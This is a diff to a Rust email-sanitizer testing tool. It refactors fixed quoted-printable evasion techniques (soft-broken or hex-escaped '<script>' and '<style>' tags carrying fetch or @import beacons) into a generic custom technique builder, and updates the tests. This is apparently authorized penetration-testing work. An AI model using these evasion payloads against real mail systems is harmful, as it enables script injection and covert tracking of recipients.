@@ -1468,14 +1468,6 @@ mod technique_message_tests {
         assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "not-a-real-technique").is_err());
     }
 
-    #[test]
-    fn qp_natural_wrap_variant_out_of_range_is_rejected() {
-        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-0").is_err());
-        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-11").is_err());
-        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-abc").is_err());
-        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-5").is_ok());
-    }
-
     // Every technique message needs a real Date and Message-ID header
     // (RFC 5322 §3.6) - these bypass lettre's typed Message::builder(),
     // which would otherwise add a missing Date automatically, so this file
@@ -1492,14 +1484,6 @@ mod technique_message_tests {
             "mime-alternative-control-img",
             "mime-alternative-control-css",
             "encoded-word-header",
-            "qp-soft-break",
-            "qp-soft-break-style",
-            "qp-hex-escaped-tags",
-            "qp-hex-escaped-style-tags",
-            "qp-hex-open-angle-only",
-            "qp-hex-close-angle-only",
-            "qp-natural-wrap-1",
-            "qp-natural-wrap-10",
         ] {
             let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, technique).unwrap();
             let text = as_text(&bytes);
@@ -1590,88 +1574,6 @@ mod technique_message_tests {
         assert!(std::str::from_utf8(&bytes).is_err());
     }
 
-    #[test]
-    fn qp_soft_break_message_never_shows_script_unbroken() {
-        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-soft-break").unwrap();
-        let text = as_text(&bytes);
-        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
-        // "script" (either tag) must NEVER appear as one intact substring -
-        // only split across the soft break.
-        assert!(!text.contains("<script"));
-        assert!(!text.contains("</script"));
-        assert!(text.contains("<scri=\r\npt>"));
-        assert!(text.contains("</scri=\r\npt>"));
-        // The Polish pangram's own quoted-printable encoding must be
-        // present too, not just the split tag trick on its own.
-        assert!(text.contains("Za=C5=BC=C3=B3=C5=82=C4=87"));
-        assert!(text.contains(BEACON));
-    }
-
-    #[test]
-    fn qp_soft_break_style_message_never_shows_style_unbroken() {
-        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-soft-break-style").unwrap();
-        let text = as_text(&bytes);
-        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
-        assert!(!text.contains("<style"));
-        assert!(!text.contains("</style"));
-        assert!(text.contains("<sty=\r\nle>"));
-        assert!(text.contains("</sty=\r\nle>"));
-        assert!(text.contains("@import"));
-        assert!(text.contains(BEACON));
-    }
-
-    #[test]
-    fn qp_hex_escaped_style_tags_message_has_no_literal_angle_brackets_around_style() {
-        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-escaped-style-tags").unwrap();
-        let text = as_text(&bytes);
-        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
-        assert!(!text.contains("<style"));
-        assert!(!text.contains("</style"));
-        assert!(text.contains("=3Cstyle=3E"));
-        assert!(text.contains("=3C/style=3E"));
-        assert!(text.contains("@import"));
-        assert!(text.contains(BEACON));
-    }
-
-    #[test]
-    fn qp_hex_escaped_tags_message_has_no_literal_angle_brackets_around_script() {
-        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-escaped-tags").unwrap();
-        let text = as_text(&bytes);
-        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
-        assert!(!text.contains("<script"));
-        assert!(!text.contains("</script"));
-        assert!(text.contains("=3Cscript=3E"));
-        assert!(text.contains("=3C/script=3E"));
-        assert!(text.contains(BEACON));
-    }
-
-    #[test]
-    fn qp_hex_open_angle_only_message_leaves_the_closing_bracket_literal() {
-        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-open-angle-only").unwrap();
-        let text = as_text(&bytes);
-        // The opening '<' is hex-escaped (no literal "<script" substring
-        // anywhere), but "script>" and "/script>" stay literal - isolates
-        // whether a scanner needing to see BOTH brackets behaves
-        // differently from one that only cares about "<script" alone.
-        assert!(!text.contains("<script"));
-        assert!(text.contains("=3Cscript>"));
-        assert!(text.contains("=3C/script>"));
-        assert!(text.contains(BEACON));
-    }
-
-    #[test]
-    fn qp_hex_close_angle_only_message_leaves_the_opening_bracket_literal() {
-        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-close-angle-only").unwrap();
-        let text = as_text(&bytes);
-        // Mirror image: the literal "<script" substring IS present (only
-        // '>' is hex-escaped), but no complete, literal "<script>" tag
-        // shape ever appears in the raw bytes.
-        assert!(text.contains("<script"));
-        assert!(!text.contains("<script>"));
-        assert!(!text.contains("</script>"));
-        assert!(text.contains("script=3E"));
-        assert!(text.contains(BEACON));
-    }
 }
 
 #[cfg(test)]
@@ -1854,14 +1756,14 @@ mod quoted_printable_encode_tests {
 
 #[cfg(test)]
 mod quoted_printable_encode_folded_tests {
-    use super::{build_qp_natural_wrap_message, quoted_printable_encode, quoted_printable_encode_folded, qp_natural_wrap_variant_text};
+    use super::{build_custom_technique_message, quoted_printable_encode, quoted_printable_encode_folded};
 
     #[test]
     fn no_line_exceeds_the_76_column_limit() {
         // Long enough, with enough non-ASCII, to force multiple wraps -
         // every line between "=\r\n" soft breaks (and the final line) must
         // stay within the real RFC 2045 limit.
-        let input = qp_natural_wrap_variant_text(10).repeat(3);
+        let input = "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy i radosny dzisiaj, kochany przyjacielu z pięknej i bardzo dalekiej Łodzi. ".repeat(3);
         let folded = quoted_printable_encode_folded(&input);
         for line in folded.split("\r\n") {
             assert!(line.len() <= 76, "line exceeded 76 chars: {:?} ({})", line, line.len());
@@ -1880,21 +1782,23 @@ mod quoted_printable_encode_folded_tests {
     }
 
     #[test]
-    fn variants_sweep_different_wrap_phases() {
-        // The whole point of having 10 variants of different filler
-        // length: each one shifts where <script> lands relative to the
-        // 76-column boundary. Confirm the byte offset of the literal
-        // "<script" substring genuinely differs across at least a few
-        // variants (not all coincidentally identical, which would defeat
-        // the purpose of sweeping the offset at all).
+    fn varying_filler_length_sweeps_the_wrap_phase() {
+        // The whole point of the custom technique builder's "natural-wrap"
+        // mechanism accepting free-form filler text (not just a fixed
+        // preset): different filler lengths shift where <script> lands
+        // relative to the 76-column boundary. Confirm the byte offset of
+        // the literal "<script" substring genuinely differs across a
+        // handful of different-length fillers (not all coincidentally
+        // identical, which would defeat the purpose of varying it at all).
         let mut offsets = std::collections::HashSet::new();
-        for variant in 1..=10u32 {
-            let msg = build_qp_natural_wrap_message("a@example.com", "b@example.com", "s", "https://x.example/hit/t", variant);
+        for filler_len in [5usize, 20, 50, 90, 140] {
+            let filler = "Zażółć gęślą jaźń, ".chars().cycle().take(filler_len).collect::<String>();
+            let msg = build_custom_technique_message("a@example.com", "b@example.com", "s", "https://x.example/hit/t", "script", "natural-wrap", Some(&filler)).unwrap();
             let text = String::from_utf8_lossy(&msg);
-            let offset = text.find("script").expect("every variant must still contain the word script somewhere");
+            let offset = text.find("script").expect("every filler length must still contain the word script somewhere");
             offsets.insert(offset);
         }
-        assert!(offsets.len() > 1, "all 10 variants produced the exact same offset - the length sweep isn't doing anything");
+        assert!(offsets.len() > 1, "every filler length produced the exact same offset - varying it isn't doing anything");
     }
 }
 
@@ -5437,78 +5341,16 @@ fn quoted_printable_encode(input: &str) -> String {
     out
 }
 
-// Splits the word "script" (both the opening and closing tag) with a soft
-// line break exactly in the middle - "scri=\r\npt" decodes back to "script"
-// even though that substring never appears unbroken anywhere in the wire
-// bytes. Padded with the classic Polish pangram (genuinely quoted-printable
-// -encoded, not just decoration) since that's the exact real-world case the
-// tip named - a sender actually writing Polish text is what forces a mail
-// system to genuinely exercise this encoding path at all, rather than us
-// declaring it artificially.
-fn build_qp_soft_break_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
-    let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
-    let body = format!(
-        "<p>{pangram_encoded}</p><p>Test:</p><scri=\r\npt>fetch('{beacon_url}').catch(function(){{}})</scri=\r\npt>",
-        pangram_encoded = pangram_encoded,
-        beacon_url = beacon_url
-    );
-    let message = format!(
-        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject, beacon_url),
-        body = body
-    );
-    message.into_bytes()
-}
-
-// Every QP evasion technique above (this one included) only ever targeted
-// <script> - a pentester's own follow-up naming "prasowania HTML/CSS"
-// (folding of HTML/CSS) specifically called out CSS too, and this app's
-// one CONFIRMED real finding this session was a CSS @import sanitizer
-// gap (css-import in PAYLOADS above) - never combined with any of the
-// SMTP/MIME-encoding evasion mechanics tested against <script>. Same
-// split-the-tag-name soft break as build_qp_soft_break_message, applied
-// to <style>/</style> instead of <script>/</script>.
-fn build_qp_soft_break_style_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
-    let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
-    let body = format!(
-        "<p>{pangram_encoded}</p><p>Test:</p><sty=\r\nle>@import \"{beacon_url}\";</sty=\r\nle>",
-        pangram_encoded = pangram_encoded,
-        beacon_url = beacon_url
-    );
-    let message = format!(
-        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject, beacon_url),
-        body = body
-    );
-    message.into_bytes()
-}
-
-// CSS companion to build_qp_hex_escaped_tags_message - hex-escapes both
-// '<' and '>' around <style>/</style> instead of <script>/</script>, same
-// reasoning (no literal "<style"/"</style" substring anywhere in the raw
-// wire bytes).
-fn build_qp_hex_escaped_style_tags_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
-    let body = format!(
-        "<p>Test:</p>=3Cstyle=3E@import \"{beacon_url}\";=3C/style=3E",
-        beacon_url = beacon_url
-    );
-    let message = format!(
-        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject, beacon_url),
-        body = body
-    );
-    message.into_bytes()
-}
-
 // RFC 2045 §6.7 rule 5: an encoded line must not exceed 76 characters
 // (not counting the trailing CRLF) - a real, standards-compliant QP
 // encoder inserts its OWN soft line break (a trailing '=' + CRLF, removed
 // on decode same as above) wherever that limit is hit, at whatever
 // position that happens to fall, based purely on running column count.
 // This is deliberately different from quoted_printable_encode() above:
-// qp-soft-break/qp-hex-escaped-tags hand-place ONE break at a byte offset
-// WE chose (proving the mechanic exists at all); this lets the wrap land
-// wherever the real 76-column rule actually puts it, which is what an
+// the custom technique builder's own "soft-break" mechanism hand-places
+// ONE break at a chosen point (build_custom_technique_message below,
+// splitting the tag name itself); this lets the wrap land wherever the
+// real 76-column rule actually puts it, which is what an
 // uncontrolled real-world sender (a webmail's own outbound encoder, or a
 // relaying MTA that re-encodes on the way through) would produce - never
 // splits a "=XX" escape triplet itself, only ever breaks between whole
@@ -5535,100 +5377,6 @@ fn quoted_printable_encode_folded(input: &str) -> String {
     out
 }
 
-// Ten hand-written Polish filler sentences of increasing length (a
-// pentester's own suggested test shape, verbatim) - the point isn't any
-// one exact length, it's that varying how much text precedes <script>
-// across variants sweeps the phase of where the 76-column wrap boundary
-// falls relative to that word, without us ever choosing the split point
-// ourselves the way qp-soft-break does.
-fn qp_natural_wrap_variant_text(variant: u32) -> &'static str {
-    match variant {
-        1 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj.",
-        2 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu.",
-        3 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi.",
-        4 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś.",
-        5 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś daleko.",
-        6 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo daleko.",
-        7 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo daleko.",
-        8 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo, bardzo daleko.",
-        9 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, kochany przyjacielu z pięknej i dalekiej Łodzi.",
-        _ => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy i radosny dzisiaj, kochany przyjacielu z pięknej i bardzo dalekiej Łodzi.",
-    }
-}
-
-fn build_qp_natural_wrap_message(from: &str, to: &str, subject: &str, beacon_url: &str, variant: u32) -> Vec<u8> {
-    let filler = qp_natural_wrap_variant_text(variant);
-    let raw_html = format!(
-        "<p>{filler} <script>fetch('{beacon_url}').catch(function(){{}})</script></p>",
-        filler = filler,
-        beacon_url = beacon_url
-    );
-    let body = quoted_printable_encode_folded(&raw_html);
-    let message = format!(
-        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject, beacon_url),
-        body = body
-    );
-    message.into_bytes()
-}
-
-// Companion technique: '<' and '>' are already safe/printable ASCII and a
-// standards-compliant encoder would never bother escaping them - but a
-// compliant DECODER must still turn "=3C"/"=3E" back into real '<'/'>'
-// regardless of whether encoding them was "necessary" (quoted-printable
-// allows ANY octet to be represented as "=XX", not just the ones that
-// strictly require it). Hex-escaping the tag delimiters themselves means no
-// literal '<script'/'</script>' substring exists anywhere in the raw wire
-// bytes at all - tests whether anything scans those raw bytes for known-bad
-// substrings BEFORE quoted-printable decoding happens, rather than after.
-fn build_qp_hex_escaped_tags_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
-    let body = format!(
-        "<p>Test:</p>=3Cscript=3Efetch('{beacon_url}').catch(function(){{}})=3C/script=3E",
-        beacon_url = beacon_url
-    );
-    let message = format!(
-        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject, beacon_url),
-        body = body
-    );
-    message.into_bytes()
-}
-
-// Companion pair to the message above - that one hex-escapes BOTH '<' and
-// '>' together, which can't tell apart a scanner that only cares about the
-// literal "<script" substring (never requiring a closing '>') from one
-// that needs a complete "<...>" shape to recognize something as a tag
-// worth stripping. These two isolate each angle bracket on its own: only
-// '<' escaped (literal "script>" left readable) vs only '>' escaped
-// (literal "<script" left readable) - if either alone behaves differently
-// from both-escaped, that pins down which bracket actually matters to
-// whatever's doing the scanning.
-fn build_qp_hex_open_angle_only_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
-    let body = format!(
-        "<p>Test:</p>=3Cscript>fetch('{beacon_url}').catch(function(){{}})=3C/script>",
-        beacon_url = beacon_url
-    );
-    let message = format!(
-        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject, beacon_url),
-        body = body
-    );
-    message.into_bytes()
-}
-
-fn build_qp_hex_close_angle_only_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
-    let body = format!(
-        "<p>Test:</p><script=3Efetch('{beacon_url}').catch(function(){{}})</script=3E",
-        beacon_url = beacon_url
-    );
-    let message = format!(
-        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject, beacon_url),
-        body = body
-    );
-    message.into_bytes()
-}
-
 fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str, technique: &str) -> Result<Vec<u8>, String> {
     match technique {
         "utf7-charset" => Ok(build_utf7_charset_message(from, to, subject, beacon_url)),
@@ -5638,21 +5386,6 @@ fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str
         "mime-alternative-control-css" => Ok(build_mime_alternative_control_css_message(from, to, subject, beacon_url)),
         "encoded-word-header" => Ok(build_encoded_word_header_message(from, to, subject, beacon_url)),
         "overlong-utf8" => Ok(build_overlong_utf8_message(from, to, subject, beacon_url)),
-        "qp-soft-break" => Ok(build_qp_soft_break_message(from, to, subject, beacon_url)),
-        "qp-soft-break-style" => Ok(build_qp_soft_break_style_message(from, to, subject, beacon_url)),
-        "qp-hex-escaped-style-tags" => Ok(build_qp_hex_escaped_style_tags_message(from, to, subject, beacon_url)),
-        "qp-hex-escaped-tags" => Ok(build_qp_hex_escaped_tags_message(from, to, subject, beacon_url)),
-        "qp-hex-open-angle-only" => Ok(build_qp_hex_open_angle_only_message(from, to, subject, beacon_url)),
-        "qp-hex-close-angle-only" => Ok(build_qp_hex_close_angle_only_message(from, to, subject, beacon_url)),
-        other if other.starts_with("qp-natural-wrap-") => {
-            let variant: u32 = other["qp-natural-wrap-".len()..]
-                .parse()
-                .map_err(|_| format!("Unknown technique: {other}"))?;
-            if variant < 1 || variant > 10 {
-                return Err(format!("Unknown technique: {other}"));
-            }
-            Ok(build_qp_natural_wrap_message(from, to, subject, beacon_url, variant))
-        }
         other => Err(format!("Unknown technique: {other}")),
     }
 }
@@ -5666,10 +5399,11 @@ fn finish_qp_message(from: &str, to: &str, subject: &str, beacon_url: &str, body
     message.into_bytes()
 }
 
-// Same Polish pangram used by the fixed qp-* techniques above, repeated
-// and truncated to an exact character count - lets the LS panel's custom
-// technique builder sweep ANY filler length the user types in, rather
-// than only the 10 fixed qp-natural-wrap-N offsets.
+// The classic Polish pangram, repeated and truncated to an exact
+// character count - the LS panel's custom technique builder uses this to
+// seed its filler-text preview at whatever length the user asks for
+// (editable/pasteable afterward, see build_custom_technique_message
+// below).
 fn build_filler_text(target_len: u32) -> String {
     let base = "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj. ";
     let mut out = String::new();
@@ -5679,13 +5413,13 @@ fn build_filler_text(target_len: u32) -> String {
     out.chars().take(target_len as usize).collect()
 }
 
-// Generic version of the fixed qp-soft-break(-style)/qp-hex-*(-style-tags)
-// pairs above - instead of one hand-written Rust function per (vector,
-// mechanism) combination, the LS panel's "Custom technique builder" lets
-// the user pick both freely (plus, for natural-wrap, the exact filler
-// text itself - editable/pasteable, not just a length) without needing a
-// new hardcoded technique/checkbox for every combination anyone might
-// want to try.
+// Backs the LS panel's "Custom technique builder": one generic function
+// covering every (vector, mechanism) combination the fixed qp-soft-break/
+// qp-hex-escaped-*/qp-natural-wrap-N presets used to hand-write one Rust
+// function per combination for, before those were replaced by this plus
+// the builder's UI (letting the user pick both freely, and for
+// natural-wrap the exact filler text itself - editable/pasteable, not
+// just a length).
 fn build_custom_technique_message(
     from: &str,
     to: &str,
@@ -5704,9 +5438,10 @@ fn build_custom_technique_message(
     let body = match mechanism {
         "soft-break" => {
             // Splits the tag name itself roughly in half with a soft line
-            // break, same mechanic as build_qp_soft_break_message/
-            // build_qp_soft_break_style_message, generalized to whichever
-            // tag_name the chosen vector uses.
+            // break - "scri=\r\npt" decodes back to "script" even though
+            // that substring never appears unbroken anywhere in the wire
+            // bytes, generalized to whichever tag_name the chosen vector
+            // uses.
             let mid = tag_name.len() / 2;
             let (a, b) = tag_name.split_at(mid);
             let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
